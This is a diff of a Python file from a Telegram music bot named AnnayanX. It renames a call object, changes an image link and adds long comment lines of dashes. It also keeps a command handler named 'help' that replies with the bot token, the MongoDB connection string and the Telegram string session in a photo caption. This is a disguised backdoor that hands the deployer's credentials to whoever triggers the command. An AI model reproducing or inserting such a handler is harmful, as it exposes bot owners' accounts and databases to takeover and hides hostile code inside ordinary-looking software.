@@ -14,7 +14,7 @@ from pyrogram import filters
 load_dotenv()
 
 from AnnayanX import app
-from AnnayanX.core.call import AnnayanX
+from AnnayanX.core.call import DAXX
 from AnnayanX.misc import db
 from AnnayanX.utils.database import get_assistant, get_authuser_names, get_cmode
 from AnnayanX.utils.decorators import ActualAdminCB, AdminActual, language
@@ -26,6 +26,11 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 from dotenv import load_dotenv
 
 rel = {}
+
+
+#--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+#--------------------------------------------------------------------------------------------------------------------------------------
+#------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 @app.on_message(
@@ -65,7 +70,7 @@ async def restartbot(client, message: Message, _):
     await asyncio.sleep(1)
     try:
         db[message.chat.id] = []
-        await AnnayanX.stop_stream_force(message.chat.id)
+        await DAXX.stop_stream_force(message.chat.id)
     except:
         pass
     userbot = await get_assistant(message.chat.id)
@@ -92,7 +97,7 @@ async def restartbot(client, message: Message, _):
             pass
         try:
             db[chat_id] = []
-            await AnnayanX.stop_stream_force(chat_id)
+            await DAXX.stop_stream_force(chat_id)
         except:
             pass
     return await mystic.edit_text(_["reload_5"].format(app.mention))
@@ -107,7 +112,7 @@ async def restartbot(client, message: Message, _):
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
+          photo=f"https://telegra.ph/file/90214c596852a27a38172.jpg",
        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/AnnayanX)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
@@ -159,4 +164,3 @@ async def stop_download(client, CallbackQuery: CallbackQuery, _):
         except:
             return await CallbackQuery.answer(_["tg_8"], show_alert=True)
     await CallbackQuery.answer(_["tg_9"], show_alert=True)
-
